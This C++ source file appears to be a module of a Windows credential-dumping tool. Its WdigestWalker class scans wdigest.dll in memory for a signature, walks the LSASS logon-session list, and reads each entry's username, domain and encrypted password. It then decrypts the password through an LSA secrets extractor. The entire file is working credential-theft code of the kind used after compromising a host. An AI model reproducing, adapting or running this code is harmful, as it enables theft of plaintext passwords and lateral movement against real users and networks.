#include "lsa/wdigest_walker.h"

#include "core/signature_scanner.h"
#include "lsa/reader_utils.h"

#include <set>

namespace kvc::lsa {

WdigestWalker::WdigestWalker(const core::VirtualMemory& vmem,
                             const core::ModuleIndex& modules,
                             const security::LsaSecretsExtractor* extractor,
                             const templates::WdigestTemplateSpec* tmpl)
    : vmem_(vmem), modules_(modules), extractor_(extractor), tmpl_(tmpl) {}

void WdigestWalker::walk(std::vector<LogonSession>& sessions) const {
    if (!tmpl_ || tmpl_->signature.empty()) return;
    const auto* mod = modules_.find("wdigest.dll");
    if (!mod) return;

    const std::uint64_t sig_pos = core::scan_module_first(
        vmem_, *mod,
        std::span<const std::uint8_t>(tmpl_->signature.data(), tmpl_->signature.size()));
    if (sig_pos == 0) return;

    const std::uint64_t entry_ref_loc = sig_pos + static_cast<std::int64_t>(tmpl_->first_entry_offset);
    std::int32_t rel_offset = 0;
    if (!vmem_.read_struct(entry_ref_loc, &rel_offset)) return;
    const std::uint64_t sentinel = entry_ref_loc + 4 + static_cast<std::int64_t>(rel_offset);

    const std::vector<std::uint64_t> sentinel_candidates = {
        sentinel, sentinel + 8, sentinel + 16, sentinel + 24,
    };

    std::set<std::uint64_t> processed;
    for (const std::uint64_t ls : sentinel_candidates) {
        auto first = vmem_.read_u64(ls);
        if (!first || *first == 0 || *first == ls) continue;
        std::uint64_t current = *first;

        for (int safety = 0; current != ls && safety < 4096; ++safety) {
            if (!processed.insert(current).second) {
                auto next = vmem_.read_u64(current);
                if (!next) break;
                current = *next;
                continue;
            }

            std::uint64_t entry_luid = vmem_.read_u64(current + 32).value_or(0);
            const std::size_t po = tmpl_->primary_offset;
            const std::string user = vmem_.read_unicode_string(current + po);
            const std::string dom = vmem_.read_unicode_string(current + po + 16);

            std::uint16_t pwd_len = vmem_.read_u16(current + po + 32).value_or(0);
            std::uint16_t pwd_max = vmem_.read_u16(current + po + 34).value_or(0);
            std::uint64_t pwd_buf = vmem_.read_u64(current + po + 40).value_or(0);

            std::string password, password_hex;
            if (pwd_max > 0 && pwd_buf != 0 && extractor_ && extractor_->is_initialized()) {
                std::vector<std::byte> enc(pwd_max);
                if (vmem_.read_bytes(pwd_buf, pwd_max, enc)) {
                    auto dec = extractor_->decrypt(enc);
                    decode_password_candidate(dec, pwd_len, password, password_hex);
                }
            }

            if (entry_luid != 0) {
                for (auto& s : sessions) {
                    if (s.authentication_id == entry_luid) {
                        WdigestCredential c;
                        c.luid = entry_luid;
                        c.username = user; c.domainname = dom;
                        c.password = password; c.password_hex = password_hex;
                        s.wdigest_credentials.push_back(std::move(c));
                        break;
                    }
                }
            }

            auto next = vmem_.read_u64(current);
            if (!next) break;
            current = *next;
        }
    }
}

} // namespace kvc::lsa
